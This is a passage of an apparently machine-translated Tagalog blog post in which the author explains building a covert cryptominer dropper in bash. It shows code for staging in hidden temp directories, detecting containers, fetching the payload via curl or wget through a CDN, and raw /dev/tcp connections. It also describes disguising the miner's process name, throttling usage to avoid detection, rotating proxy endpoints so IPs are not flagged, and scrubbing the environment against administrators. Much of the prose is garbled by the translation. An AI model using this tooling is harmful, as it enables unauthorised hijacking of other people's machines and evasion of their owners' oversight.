tmux send-keys -t miner <span class=hljs-string>". ./\".. \""</span> Enter</code></pre><p>Ang launcher script ay itinapon sa isang file na nagngangalang ".." mukhang nakalilito ito dahil maaaring mapagkamalan itong isang<em> magulang</em> direktoryo At hindi namin isinasama ang utos ng sesyon, dahil tatagal ito sa proseso ng utos, sa halip ay sinisimulan muna namin ang sesyon ng tmux at ipinapadala ang pinagmumulang utos sa pamamagitan ng interface ng terminal ng tmux. Kaugnay nito, kung minsan ay tumatawag sa isang maipapatupad na<code>./</code> pinapanatili ang mga chars na iyon sa utos, kaya mas mahusay na idagdag ang<code>$PWD</code> sa daanan ..<code>PATH=$PWD:$PATH</code>.<h2 id=the_payload><a class=header-anchor href=#the_payload> Ang Payload</a></h2><p>Ang aming pag-deploy na script ay nagsisimula sa pamamagitan ng pagkuha ng<code>env.sh</code> file, at pinapanatili o na-configure ang mga vars bilang<code>STARTING_*</code> mga vars gusto<pre><code class="bash hljs">STARTING_PATH=<span class=hljs-variable>${STARTING_PATH:-<span class=hljs-variable>$PATH</span>}</span>
STARTING_PID=<span class=hljs-variable>$BASHPID</span></code></pre><p>Pinapayagan kaming patayin at muling simulan ang isang tumatakbo na halimbawa habang itinatakda ang kapaligiran. Hinahayaan lumipat sa isang direktoryo ng tmp na may mga kakayahan ng exec<pre><code class="bash hljs"><span class=hljs-comment># out local subdirectory</span>
pathname=$(<span class=hljs-built_in>printf</span><span class=hljs-string>".%-<span class=hljs-subst>$((RANDOM%9+1)</span>)s"</span><span class=hljs-keyword>for</span> ph <span class=hljs-keyword>in</span> {/tmp,/dev/shm,/run,/var/tmp,/var/cache,~/.local,~/.cache,~/}; <span class=hljs-keyword>do</span><span class=hljs-built_in>rm</span> -rf <span class=hljs-string>"<span class=hljs-variable>$ph</span>/<span class=hljs-variable>$pathname</span>"</span> &&
        <span class=hljs-built_in>mkdir</span> -p <span class=hljs-string>"<span class=hljs-variable>$ph</span>/<span class=hljs-variable>$pathname</span>"</span> &&
        tmppath=<span class=hljs-string>"<span class=hljs-variable>$ph</span>/<span class=hljs-variable>$pathname</span>"</span> &&
        is_path_executable <span class=hljs-string>"<span class=hljs-variable>$tmppath</span>"</span> &&
        <span class=hljs-built_in>export</span> PATH=<span class=hljs-string>"<span class=hljs-variable>${ph}</span>/<span class=hljs-variable>$pathname</span>:<span class=hljs-variable>${PATH}</span>"</span> tmppath &&
        <span class=hljs-built_in>break</span><span class=hljs-keyword>done</span>
[ -n <span class=hljs-string>"<span class=hljs-variable>$tmppath</span>"</span> ] && <span class=hljs-built_in>cd</span><span class=hljs-string>"<span class=hljs-variable>$tmppath</span>"</span></code></pre><p>Sinusuri kung sa loob ng a<a href=https://en.wikipedia.org/wiki/OS-level_virtualization> lalagyan</a> ay madaling gamitin din, maaari naming siyasatin ang filesystem para sa mga pahiwatig<pre><code class="bash hljs">c=$(<span class=hljs-built_in>builtin</span> compgen -G <span class=hljs-string>'/etc/cpa*'</span>)
d=$(<span class=hljs-built_in>builtin</span> compgen -G <span class=hljs-string>'/dev/*'</span>)
s=$(<span class=hljs-built_in>builtin</span> compgen -G <span class=hljs-string>'/sys/*'</span>)
p=$(<span class=hljs-built_in>builtin</span> compgen -G <span class=hljs-string>'/proc/*'</span>)
jail=
<span class=hljs-keyword>if</span> [ -n <span class=hljs-string>"<span class=hljs-variable>$c</span>"</span> -o -z <span class=hljs-string>"<span class=hljs-variable>$d</span>"</span> -o -z <span class=hljs-string>"<span class=hljs-variable>$s</span>"</span> -o -z <span class=hljs-string>"<span class=hljs-variable>$p</span>"</span> ]; <span class=hljs-keyword>then</span><span class=hljs-comment>## we are in a jail</span>
    jail=1
<span class=hljs-keyword>fi</span></code></pre><p>Ngayon ay oras na upang i-download ang aming payload, pinili namin na suportahan ang parehong wget at curl, alam na namin kung paano gamitin ang wget na may maingat na mga flag, para sa kulutin ito ay medyo kakaiba. Kailangan naming lumikha ng isang config file, at i-override<code>CURL_HOME</code><pre><code class="bash hljs"><span class=hljs-built_in>echo</span><span class=hljs-string>"url = <span class=hljs-variable>$uri</span>
output = <span class=hljs-variable>${name}</span><span class=hljs-variable>${format}</span>
connect-timeout = 10
"</span> > .curlrc
CURL_HOME=<span class=hljs-variable>$PWD</span> curl -sOL</code></pre><p>Ang huling hakbang ay upang makuha lamang ang payload<pre><code class="bash hljs"><span class=hljs-built_in>type</span> unzip &>/dev/null &&
    format=<span class=hljs-string>".zip"</span> extract=<span class=hljs-string>"unzip -q"</span> ||
        format=<span class=hljs-string>".tar.gz"</span> extract=<span class=hljs-string>"tar xf"</span></code></pre><p>Ito ay nagkakahalaga ng pagbanggit ng paggamit ng isang [CDN] para sa paglilingkod sa payload. Narito muli ang cloudflare sa pagsagip ay nakakatipid sa amin mula sa paggasta ng bandwidth. Sa pamamagitan lamang ng pagpapalit ng pangalan ng aming naka-compress na payload gamit ang a<em> extension ng file</em> suportado ng cloudflare ... nagiging cache ito. Hindi tinitingnan ng Cloudflare ang mga header ng kung ano ang ibinibigay nito, marahil dahil ang paggawa nito sa sukat na iyon ay simpleng hindi praktikal.<h2 id=adventures_down_bashland><a class=header-anchor href=#adventures_down_bashland> Ang mga pakikipagsapalaran sa Bashland</a></h2><p>Napili ang Bash gamit ang palagay na portable, hindi masyadong wala sa lugar at higit na nasa lahat ng lugar kumpara sa iba pang mga wika ng scripting tulad ng perl, ruby ​​o python. Ang totoo ay ang isang nakapag-iisang binary na nakasulat sa golang o lua ay magiging mas madali, na may mas kaunting mga bug, at mas madaling mapanatili, karaniwang bash ay ang pinakamasamang pagpipilian na posible, sa aking pagtatanggol, sa oras na nag-scrat ako ng maraming mga itches na may bash , huli na para sa isang muling pagsulat, at nakakakuha rin ng uri ng pagbubutas.<p>Mayroon ding pagpipilian na gumamit ng busybox na may compile time flag upang magamit ang lahat ng mga builtin (tulad ng grep at sed), gayunpaman ang paggamit ng builtins sa ganitong paraan ay hindi pinapayagan na itlog ang mga trabaho (tinidor) at ilalantad ang daemon sa mga potensyal na deadlocks.<p>Ilalarawan ko ang ilang mga pag-andar ng bash dito, na may magagamit na buong listahan<a href=\assets/posts/bash_functions.txt> dito</a><pre><code class="bash hljs"><span class=hljs-comment>## echo a string long $1 of random lowercase chars</span><span class=hljs-function><span class=hljs-title>rand_string</span></span>() {
    <span class=hljs-built_in>local</span> c=0
    <span class=hljs-keyword>while</span> [ <span class=hljs-variable>$c</span> -lt <span class=hljs-variable>$1</span> ]; <span class=hljs-keyword>do</span><span class=hljs-built_in>printf</span><span class=hljs-string>"\x<span class=hljs-subst>$(printf '%x' $((97+RANDOM%25)</span>))"</span>
        c=$((c+<span class=hljs-number>1</span>))
    <span class=hljs-keyword>done</span>
}</code></pre><p>Gamitin ang<code>RANDOM</code> variable upang makakuha ng isang numero sa pagitan ng 97-122 na naaayon sa isang character code, ang printf ay dapat na isang builtin, hindi namin nais na tinidor sa loob ng isang loop.<pre><code class="bash hljs"><span class=hljs-comment>## make a new file descriptor named $1</span><span class=hljs-function><span class=hljs-title>newfd</span></span>() {
    <span class=hljs-built_in>eval</span><span class=hljs-string>"local fd=\${<span class=hljs-variable>$1</span>}"</span><span class=hljs-built_in>eval</span><span class=hljs-string>"exec <span class=hljs-variable>$fd</span>>&-"</span> &>/dev/null
    <span class=hljs-built_in>local</span> pp=<span class=hljs-string>".<span class=hljs-subst>$(rand_string 8)</span>"</span><span class=hljs-built_in>mkfifo</span><span class=hljs-variable>$pp</span><span class=hljs-built_in>unset</span><span class=hljs-string>"<span class=hljs-variable>$1</span>"</span><span class=hljs-built_in>eval</span><span class=hljs-string>"exec {<span class=hljs-variable>$1</span>}<><span class=hljs-variable>$pp</span>"</span><span class=hljs-comment># unlink the named pipe</span><span class=hljs-built_in>rm</span> -f <span class=hljs-variable>$pp</span>
}</code></pre><p>Mga leverage na tubo upang lumikha ng mga hindi nagpapakilalang mga tagapaglaraw ng file, ang mga ito ay hindi kumikilos nang eksakto tulad ng mga tagapaglaraw ng file ngunit sapat ang mga ito para sa<a href=https://en.wikipedia.org/wiki/Inter-process_communication> IPC</a>.<pre><code class="bash hljs"><span class=hljs-comment>## https://unix.stackexchange.com/a/407383/163931</span><span class=hljs-function><span class=hljs-title>fleep</span></span>()
{
    <span class=hljs-comment># log "fleep: called by ${FUNCNAME[1]}"</span>
    [ -n <span class=hljs-string>"<span class=hljs-variable>${_snore_fd}</span>"</span> -a <span class=hljs-string>"<span class=hljs-variable>$1</span>"</span> != 0 ] ||
        newfd _snore_fd
    <span class=hljs-comment># log "fleep: starting waiting with ${_snore_fd}"</span><span class=hljs-keyword>if</span> ! <span class=hljs-built_in>command</span> >&<span class=hljs-variable>${_snore_fd}</span>; <span class=hljs-keyword>then</span>
        newfd _snore_fd
    <span class=hljs-keyword>fi</span><span class=hljs-built_in>read</span> -t <span class=hljs-variable>${1:-1}</span> -u <span class=hljs-variable>$_snore_fd</span><span class=hljs-comment># log "fleep: ended"</span>
}</code></pre><p>Natutulog nang walang forking, sa pamamagitan ng pag-abuso sa pag-andar ng timeout ng nabasang builtin, gumagamit ito ng isang nakalaang tagapaglarawan ng file at dapat nating tiyakin na magagamit ito upang maiwasan ang pagwawakas.<p>Mayroong mga pagpapaandar tulad<code>get_pid_stats</code>, <code>usgmon_prc</code>, <code>proc_usg_u</code>, <code>cpumon</code>, <code>loadmon</code> ay ginagamit upang subaybayan ang paggamit ng system, ginagamit ng lahat ang linux<code>/proc</code> mga file na walang tool tulad ng<code>ps</code> , kaya walang forking, lahat puro bash.<pre><code class="bash hljs"><span class=hljs-function><span class=hljs-title>start_coproc</span></span>() {
    <span class=hljs-built_in>local</span><span class=hljs-built_in>unset</span><span class=hljs-keyword>while</span> :; <span class=hljs-keyword>do</span><span class=hljs-keyword>if</span> [ <span class=hljs-string>"<span class=hljs-variable>$1</span>"</span> = <span class=hljs-built_in>exec</span> ]; <span class=hljs-keyword>then</span>
            coproc_name=<span class=hljs-string>"<span class=hljs-variable>$2</span>"</span><span class=hljs-keyword>else</span>
            coproc_name=<span class=hljs-string>"<span class=hljs-variable>$1</span>"</span><span class=hljs-keyword>fi</span><span class=hljs-keyword>if</span> [ -n <span class=hljs-string>"<span class=hljs-variable>$UNSET_COPROC_VARS</span>"</span> ]; <span class=hljs-keyword>then</span><span class=hljs-built_in>unset</span>=<span class=hljs-string>"unset <span class=hljs-variable>$UNSET_COPROC_VARS</span>;"</span><span class=hljs-keyword>fi</span><span class=hljs-built_in>log</span><span class=hljs-string>"starting coproc <span class=hljs-variable>$coproc_name</span>"</span><span class=hljs-built_in>unset</span> -v <span class=hljs-string>"<span class=hljs-variable>$coproc_name</span>"</span><span class=hljs-comment>## only the variable, not functions</span><span class=hljs-built_in>eval</span><span class=hljs-string>"coproc <span class=hljs-variable>$coproc_name</span> { <span class=hljs-variable>$unset</span> $*; }"</span><span class=hljs-comment># 2>/dev/null</span><span class=hljs-built_in>unset</span> UNSET_COPROC_VARS
        wait_coproc <span class=hljs-string>"<span class=hljs-variable>$coproc_name</span>"</span> 3 && <span class=hljs-built_in>break</span><span class=hljs-keyword>done</span>
}
<span class=hljs-function><span class=hljs-title>stop_coproc</span></span>() {
    <span class=hljs-comment>## clear fds</span>
    id_coproc <span class=hljs-string>"<span class=hljs-variable>$1</span>"</span> && [ -n <span class=hljs-string>"<span class=hljs-variable>$job_n</span>"</span> ] && <span class=hljs-built_in>eval</span><span class=hljs-string>"kill -<span class=hljs-variable>${2:-9}</span> %<span class=hljs-variable>$job_n</span>"</span> ||
        { <span class=hljs-built_in>eval</span><span class=hljs-string>"kill -<span class=hljs-variable>${2:-9}</span> \${<span class=hljs-variable>${1}</span>_PID}"</span>; } ||
        { <span class=hljs-built_in>log</span><span class=hljs-string>"could not kill the specified coprocess with job <span class=hljs-variable>$job_n</span>"</span> && <span class=hljs-built_in>return</span> 1; }
}</code></pre><p>Magagamit ang mga Coprocess mula pa noong bash<code>v4</code> , ang mga ito ay tulad ng mga trabaho maliban kung mayroon silang isang pangalan at kanilang sariling mga tagapaglaraw ng file.<pre><code class="bash hljs"><span class=hljs-comment>## clear file descriptors</span><span class=hljs-function><span class=hljs-title>clear_fds</span></span>() {
    <span class=hljs-built_in>local</span> fd
    <span class=hljs-keyword>for</span> fd <span class=hljs-keyword>in</span> $(compgen -G <span class=hljs-string>"/proc/<span class=hljs-variable>$BASHPID</span>/fd/*"</span>); <span class=hljs-keyword>do</span>
        fd=<span class=hljs-variable>${fd/*\/}</span><span class=hljs-keyword>if</span> [[ ! <span class=hljs-string>" $* "</span> =~ <span class=hljs-string>" <span class=hljs-variable>${fd}</span> "</span> ]]; <span class=hljs-keyword>then</span><span class=hljs-keyword>case</span><span class=hljs-string>"<span class=hljs-variable>$fd</span>"</span><span class=hljs-keyword>in</span>
                    0|1|2|255|<span class=hljs-string>"<span class=hljs-variable>$_snore_fd</span>"</span>)
                    ;;
                    *)
                        <span class=hljs-built_in>eval</span><span class=hljs-string>"exec <span class=hljs-variable>$fd</span>>&-"</span>
                        ;;
                <span class=hljs-keyword>esac</span><span class=hljs-keyword>fi</span><span class=hljs-keyword>done</span>
}</code></pre><p>Nagsusulat kami ng isang daemon, na kung saan ay isang mahabang buhay na proseso, at gumagamit kami ng maraming mga tagapaglaraw ng file, nais talaga naming gumawa ng ilang mga paglilinis upang maiwasan ang mangyari<a href=https://web.archive.org/web/https://linux.die.net/man/5/limits.conf> ulimits</a>.<pre><code class="bash hljs"><span class=hljs-comment>## queries ipinfo and gets the current ip and country/region</span><span class=hljs-function><span class=hljs-title>parse_ip</span></span> ()
{
    <span class=hljs-built_in>export</span> ip country region;
    [ ! -e cfg/geoip.json ] && <span class=hljs-built_in>log</span><span class=hljs-string>"geolocation codes file not found."</span> && <span class=hljs-built_in>return</span> 1;
    ipquery=$(http_req ipinfo.io);
    [ -z <span class=hljs-string>"<span class=hljs-variable>$ipquery</span>"</span> ] && <span class=hljs-built_in>log</span><span class=hljs-string>"failed querying ipinfo"</span> && <span class=hljs-built_in>return</span> 1;
    before_after <span class=hljs-string>'ip\": \"'</span><span class=hljs-string>"<span class=hljs-variable>$ipquery</span>"</span><span class=hljs-string>'\"'</span>;
    ip=$(<span class=hljs-built_in>echo</span><span class=hljs-variable>$after</span>);
    [ -z <span class=hljs-string>"<span class=hljs-variable>$ip</span>"</span> ] && <span class=hljs-built_in>log</span><span class=hljs-string>"failed parsing ipinfo data ip"</span> && <span class=hljs-built_in>return</span> 1;
    before_after <span class=hljs-string>'country\": \"'</span><span class=hljs-string>"<span class=hljs-variable>$ipquery</span>"</span><span class=hljs-string>'\"'</span>;
    country=$(<span class=hljs-built_in>echo</span><span class=hljs-variable>${after,,}</span>);
    [ -z <span class=hljs-string>"<span class=hljs-variable>$country</span>"</span> ] && <span class=hljs-built_in>log</span><span class=hljs-string>"failed parsing ipinfo data country"</span> && <span class=hljs-built_in>return</span> 1;
    <span class=hljs-keyword>while</span><span class=hljs-built_in>read</span> l; <span class=hljs-keyword>do</span><span class=hljs-keyword>if</span> [ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> != <span class=hljs-string>"<span class=hljs-variable>${l/\": {}</span>"</span> ]; <span class=hljs-keyword>then</span>
            before_after <span class=hljs-string>'"'</span><span class=hljs-string>"<span class=hljs-variable>$l</span>"</span><span class=hljs-string>'"'</span>;
            lastregion=$(<span class=hljs-built_in>echo</span><span class=hljs-variable>$after</span>);
        <span class=hljs-keyword>else</span><span class=hljs-keyword>if</span> [ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> != <span class=hljs-string>"<span class=hljs-variable>${l/\"<span class=hljs-variable>${country}</span>\"}</span>"</span> ]; <span class=hljs-keyword>then</span>
                region=<span class=hljs-variable>$lastregion</span>;
                <span class=hljs-built_in>break</span>;
            <span class=hljs-keyword>fi</span>;
        <span class=hljs-keyword>fi</span>;
    <span class=hljs-keyword>done</span> < cfg/geoip.json
}</code></pre><p>Ang pagpapaandar na ito ay umaasa<a href=https://ipinfo.io/> ipinfo</a> upang matukoy ang rehiyon ng manggagawa, na nagbibigay-daan upang ibagay ang ilang lohika na umaasa sa rehiyon,<a href=\assets/posts/geoip.json> geoip.json</a> pinapangkat ang mga bansa sa mga rehiyon, dahil nais namin ang nangungunang antas na rehiyon, at hindi interesado sa tukoy na bansa.<pre><code class="bash hljs"><span class=hljs-comment># try to open a connection to host $1 with port $2 and output to $3</span><span class=hljs-function><span class=hljs-title>open_connection</span></span>() {
    <span class=hljs-built_in>exec</span> {socket}<>/dev/tcp/<span class=hljs-variable>${1}</span>/<span class=hljs-variable>${2}</span> 2>/dev/null
    <span class=hljs-built_in>echo</span><span class=hljs-variable>$socket</span> >&<span class=hljs-variable>${3}</span>
}

<span class=hljs-comment>## check if a tcp connection to $1=$HOST $2=$PORT is successful</span><span class=hljs-function><span class=hljs-title>check_connection</span></span>() {
    <span class=hljs-built_in>local</span> host=<span class=hljs-variable>$1</span> port=<span class=hljs-variable>$2</span> conn_socket=
    [ -z <span class=hljs-string>"<span class=hljs-variable>$host</span>"</span> ] && { <span class=hljs-built_in>echo</span><span class=hljs-string>'no host provided'</span>; <span class=hljs-built_in>return</span> 1; }
    [ -z <span class=hljs-string>"<span class=hljs-variable>$port</span>"</span> ] && { <span class=hljs-built_in>echo</span><span class=hljs-string>'no port provided'</span>; <span class=hljs-built_in>return</span> 1; }
    newfd conn_socket
    <span class=hljs-built_in>timeout</span> 3 open_connection <span class=hljs-variable>$host</span><span class=hljs-variable>$port</span><span class=hljs-variable>$conn_socket</span><span class=hljs-comment># read the fd of the opened connection from the conn_socket fd and close it</span>
    read_fd <span class=hljs-variable>$conn_socket</span> avl -
    <span class=hljs-keyword>if</span> [ -n <span class=hljs-string>"<span class=hljs-variable>$avl</span>"</span> ]; <span class=hljs-keyword>then</span><span class=hljs-comment># close connection</span><span class=hljs-built_in>eval</span><span class=hljs-string>"exec <span class=hljs-variable>${avl}</span><&-"</span> &>/dev/null
        <span class=hljs-built_in>return</span> 0 <span class=hljs-comment>## connection can be established</span><span class=hljs-keyword>else</span><span class=hljs-built_in>return</span> 1 <span class=hljs-comment>## connection can't be established</span><span class=hljs-keyword>fi</span>
}</code></pre><p>Ang Bash ay may suporta para sa mga koneksyon sa tcp, sa pamamagitan ng pagkakaroon ng isang abstraction<code>/dev/tcp</code> (para din sa udp, ngunit karamihan ay tila karaniwang hindi pinagana sa oras ng pagbuo, kaya hindi mo ito maaasahan). Ang mga file na ito ay isang bash bagay, hindi sila bahagi ng linux<code>/dev</code> puno.<p>Sulit na banggitin din ang isang locking system upang mahawakan ang pagsabay sa pagitan ng mga bash na trabaho. Upang pahintulutan ang maraming trabaho na gumana sa mga kandado kailangan nilang lahat na magbahagi ng isang deskriptor ng file, sa gayon ang aming<code>locker</code> na isang trabaho din, ay dapat na magsimula bago ang ibang mga trabaho na nais na gamitin ang lock. Ang locker ay simpleng nagbabasa<code>stdin</code> naghihintay para sa mga kahilingan sa pagla-lock, pagtugon sa<code>stdout</code> nakasalalay sa kasalukuyang estado ng boolean na nakaimbak sa isang variable. Hindi ko ginagarantiyahan na ang diskarte na ito ay walang lahi, ngunit tila gagana nang disente, sa kabilang banda, natagpuan ko ang mga tagapaglaraw ng file na hindi masyadong maaasahan, dahil sa hinala kong may ilang mga buffer na hindi mapula sa isang lugar<em> mga tubo</em> at sa kalaunan ay tumatama sa mga deadlock (na nangangahulugang hindi ka maaaring umasa sa locker na nagbibigay sa iyo ng isang sagot sa lahat ng oras).<pre><code class="bash hljs"><span class=hljs-comment>## unset bash env apart excluded vars/funcs</span><span class=hljs-function><span class=hljs-title>clear_env</span></span>(){
    <span class=hljs-built_in>local</span><span class=hljs-built_in>functions</span>=$(<span class=hljs-built_in>declare</span> -F)
    <span class=hljs-built_in>functions</span>=<span class=hljs-variable>${functions//declare -f }</span><span class=hljs-keyword>for</span> u <span class=hljs-keyword>in</span><span class=hljs-variable>$@</span>; <span class=hljs-keyword>do</span><span class=hljs-built_in>functions</span>=<span class=hljs-variable>${functions/$u[[:space:]]}</span><span class=hljs-built_in>functions</span>=<span class=hljs-variable>${functions/[[:space:]]$u}</span><span class=hljs-built_in>functions</span>=<span class=hljs-variable>${functions/[[:space:]]$u[[:space:]]}</span><span class=hljs-keyword>done</span><span class=hljs-built_in>local</span> vars=$(<span class=hljs-built_in>set</span> -o posix; <span class=hljs-built_in>set</span> | <span class=hljs-keyword>while</span><span class=hljs-built_in>read</span> l; <span class=hljs-keyword>do</span><span class=hljs-built_in>echo</span><span class=hljs-variable>${l/=*}</span>; <span class=hljs-keyword>done</span>)
    <span class=hljs-keyword>for</span> u <span class=hljs-keyword>in</span><span class=hljs-variable>$@</span>; <span class=hljs-keyword>do</span>
        vars=<span class=hljs-variable>${vars/$u[[:space:]]}</span>
        vars=<span class=hljs-variable>${vars/[[:space]]$u}</span>
        vars=<span class=hljs-variable>${vars/[[:space:]]$u[[:space:]]}</span><span class=hljs-keyword>done</span><span class=hljs-built_in>unset</span> -f <span class=hljs-variable>$functions</span> &>/dev/null
    <span class=hljs-built_in>unset</span> -v <span class=hljs-variable>$vars</span> &>/dev/null
    <span class=hljs-comment># unset $vars &>/dev/null</span>
}

<span class=hljs-comment>## unexport most variables</span><span class=hljs-function><span class=hljs-title>dex_env</span></span>() {
    exported=$(<span class=hljs-built_in>export</span> -p)
    <span class=hljs-keyword>while</span><span class=hljs-built_in>read</span> e; <span class=hljs-keyword>do</span>
        n=<span class=hljs-variable>${e/declare -*x }</span>
        [ <span class=hljs-string>"<span class=hljs-variable>$n</span>"</span> = <span class=hljs-string>"<span class=hljs-variable>$e</span>"</span> ] && <span class=hljs-built_in>continue</span><span class=hljs-comment>## multiline var</span>
        n=<span class=hljs-variable>${n/=*}</span><span class=hljs-keyword>case</span><span class=hljs-string>"<span class=hljs-variable>$n</span>"</span><span class=hljs-keyword>in</span><span class=hljs-string>"SHELL"</span>|<span class=hljs-string>"USER"</span>|<span class=hljs-string>"HOME"</span>|<span class=hljs-string>"TMUX"</span>|<span class=hljs-string>"CHARSET"</span>|<span class=hljs-string>"TERM"</span>)
                <span class=hljs-built_in>continue</span>
                ;;
            *)
                dexported=<span class=hljs-string>"<span class=hljs-variable>$dexported</span><span class=hljs-variable>${n/=*}</span>"</span><span class=hljs-keyword>esac</span><span class=hljs-keyword>done</span> <<<<span class=hljs-string>"<span class=hljs-variable>$exported</span>"</span><span class=hljs-built_in>export</span> -n <span class=hljs-variable>$dexported</span>
}</code></pre><p>Linisin ang iyong basura ... ang mga kumplikadong bash na programa ay nagtatapos sa paggamit ng maraming mga variable, at kung aabuso mo ang pandaigdigang puwang ay namumula ito. Kung ikaw ay pangingitlog ng mga trabaho sa shell, minana nila ang lahat ng kapaligiran (na mabisang nadoble, hindi naibahagi), maaari mong mabilis na mapunta sa pagkain ng bash<code>100M</code> ng memorya, hindi maganda. Gayundin talagang nais naming maging mababang profile. Sa aming sitwasyon sa pag-deploy, ang kalaban<sup id=fnref:adversary><a class=fnref href=#fndef:adversary>[1]</a></sup> maaaring potensyal na magkaroon ng root access at kumpletong impormasyon tungkol sa aming mga proseso<sup id=fnref:infoproc><a class=fnref href=#fndef:infoproc>[2]</a></sup> , at alam mo ... ang bawat proseso ay nagtataglay ng impormasyon tungkol sa buong utos na nagsimula dito, at ang nai-export na mga variable ng kapaligiran.<h2 id=configuration><a class=header-anchor href=#configuration> Pag-configure</a></h2><p>Kapag mayroon na ang aming kapaligiran, at ang aming mga tool, kailangan nating ibagay ang aming minero para sa makina na tumatakbo ito, mga hakbang sa pagsasaayos sa pseudo code:<ul><li><p>pangalan ng proseso para sa minero<li><p>host infos (ram / cores / cache /<code>ENV_VARS</code>)<li><p>bersyon ng pagsasaayos<li><p><code>worker_id</code> para sa minero (mula sa ip at host)<li><p>ip / port para sa koneksyon</ul><p>Ang pagpili ng isang pangalan para sa proseso ay kinakailangan upang<em> tago</em> ang katotohanan na nagpapatakbo kami ng isang minero, ngunit hindi lamang namin pinalitan ang pangalan ng aming binary, mayroon kaming isang listahan ng<strong> maskara</strong> para sa mga potensyal na kandidato (isang payak na text file kung saan ang bawat linya ay maskara):<ul><li><p>pumili ng maskara nang sapalaran<li><p>i-shuffle ang mga elemento ng buntot ng string (lahat maliban sa una) upang makakuha ng magkakaibang utos ng proseso. Ngayon mayroon kaming isang string na katulad<code>cmd --arg2 --arg1 --arg3</code> . Ito ang aming maskara ng minero, pinapatakbo namin ang binary<em> wala</em> mga argumento, ngunit mukhang nagsimula kami ng isang utos<code>cmd</code> may mga argumento<code>--arg1 --arg2 --arg3</code> . Pinapayagan ang mga puwang at gitling sa mga pangalan ng file, kaya't mahusay na magpatakbo ng isang binary na pinangalanan tulad nito, tila hindi nakikita ng linux ang pagitan ng maipapatupad at ang mga argumento kapag itinatago ang mga proseso ng utos.<p>Ang pagsasaayos ng minero ay awtomatikong nai-load mula sa<code>$PWD</code>.</ul><h3 id=hashrate><a class=header-anchor href=#hashrate> Hashrate</a></h3><p>, sa paglipas ng panahon, nakakuha ng marami ang upstream miner<strong> awtomatikong pag-tune</strong> mga tampok, kaya't ginawa itong bahagi ng aking mga script na kalabisan, ngunit ang pagkakaiba sa pagitan ng upstream at downstream dito ay ang upstream na layunin ay upang i-maximize<em> pagganap</em> , habang ang aming layunin ay upang i-maximize<em> kahusayan at pagkalito</em> , hindi namin nais na abutan ang system, nais naming mag-leech nang kaunti nang walang pagkagambala sa serbisyo.<sup id=fnref:monerominer><a class=fnref href=#fndef:monerominer>[3]</a></sup><p>Para sa mga ito, kailangan namin ng higit na granular na pag-unawa sa kapaligiran, ang<code>l2/l3</code> istraktura ng cache ng processor, ram, at mga core, at kasalukuyang processor<em> average</em> load at cpu<em> paggamit</em>. Sinubukan kong bumuo ng isang<a href=https://en.wikipedia.org/wiki/Finite-state_machine> makina ng estado</a> sa bash na magsisimula mula sa walang bayad na minimum at subukan ang iba't ibang mga pagsasaayos ng dahan-dahan sa pag-aayos sa average na pinakamahusay. Iyon ay<strong> napakalaki</strong> basura ng pagsisikap na basura sa<a href=https://en.wikipedia.org/wiki/Technical_debt> teknikal na utang</a> napalugi nang mabilis at halos natapon, na may mga labi lamang na nagtatagal sa codebase.<p>I-frack ang lahat ng ito ng auto tuning jumbo, pinatulog lang namin ang minero depende sa paggamit / pag-load ng host, kinakailangan ng mga pagbabago sa minero na ito sa<code>sleep</code> sa pagitan ng mga ani ng mga thread, at ilang pag-aayos sa bantayan ng pagsasaayos<sup id=fnref:configwatch><a class=fnref href=#fndef:configwatch>[4]</a></sup> , na magpapahintulot sa amin na i-reload ang halagang natutulog sa oras ng pag-runtime. Ang lohika ay mas pinasimple at ganito ang hitsura:<ul><li><p>kung ang paggamit ay nasa itaas / mas mababa sa $ TARGET_USAGE (± margin of error) dagdagan / bawasan ang pagtulog<li><p>kung average load sa loob<code>1m</code> nasa itaas / mas mababa sa $ TARGET_LOAD pause / resume mining</ul><h3 id=connection><a class=header-anchor href=#connection> Koneksyon</a></h3><p>Sa aming bash roundup ipinakita namin ang mga kagamitan para sa koneksyon. Bakit kailangan natin ang mga ito? Dahil kailangan natin ng pagkakaiba-iba; simpleng hard coding isang endpoint sa pagsasaayos ay hindi magtatagal, kapag ang isang bagay ay mukhang kahina-hinala, at mayroong aktibidad sa network, ang mga IP ay naka-flag.<p>Sa simula ay nag-eksperimento kami sa isang pares ng mga pamamaraan:<ul><li><p>gamit<a href=https://web.archive.org/web/20210121093409/https://github.com/haad/proxychains> mga proxychain</a> upang labis na ma-overload ang mga tawag sa network ng minero, ngunit kinakailangan nito ang minero na itatayo sa mga dinamika na aklatan, at kailangan mong ipadala ang mga ito gamit ang payload, kaya't hindi ito praktikal.<li><p>tumatakbo a<a href=https://web.archive.org/web/20210315094551/https://github.com/ginuerzh/gost> pasulong na lagusan</a> magkatabi sa minero: mayroon itong maraming overhead ng pagsasaayos, tulad ng ngayon ay na-configure namin ang dalawang proseso sa bawat pag-deploy, na kung saan ay nagkakahalaga ng mas maraming mga bug.</ul><p>Sa pagtatapos ay naayos namin ang pagpapadala lamang ng isang listahan ng mga endpoint, na nakaimbak sa isang bash variable, pumili ng isa nang sapalaran. Siyempre naka-encrypt ang mga koneksyon. Ano ang mga endpoint na ito? Mga Forwarder sa proxy na hahawak sa mga trabaho ng mga minero.</p><img src=/assets/posts/chronichles_of_a_cryptonote_dropper/code/output/miner.png><p>Bakit kailangan natin ng a<a href=https://web.archive.org/web/20201207221231/https://github.com/Snipa22/xmr-node-proxy> mining proxy</a> ? Hindi talaga ako lumipas ~ 100 kasabay na mga koneksyon, kaya't ang isang proxy ay hindi talaga kinakailangan para sa pag-load ng network, ngunit maginhawa para sa pakikipag-ayos sa hash algorithm, at upang magbigay ng iba't ibang mga target sa kahirapan sa iba't ibang mga minero, upang maiwasan ang pagtatrabaho ng mga minero<strong> hirap</strong> mga target na magtatagal sa kanila ng sobrang oras upang makumpleto at maiwasan ang peligro na maaksaya ang pagkalkula sa mga hindi natapos na trabaho.<sup id=fnref:difficulty><a class=fnref href=#fndef:difficulty>[5]</a></sup> Ang software ng pool ay nangangailangan din ng ilang mga pagbabago dahil masaya itong nag-a-advertise upang maging isang proxy sa mga payak na kahilingan sa http ...<em> iyon ay dapat na mag-time-out</em> , at isang tinidor na idinagdag ang kontrol sa pag-access sa gayon ay batay kami sa aming mga mod.<sup id=fnref:stratumprotocol><a class=fnref href=#fndef:stratumprotocol>[6]</a></sup><h3 id=editing_json><a class=header-anchor href=#editing_json> Pag-edit kay json</a></h3><p>Ang paglalapat ng mga pagbabago sa isang json file na may bash lamang nakuha namin sa pamamagitan ng ilang pagpapalit ng env var, at ilang regex. Sa una ay umaasa kami sa isang<code>envsubst</code> 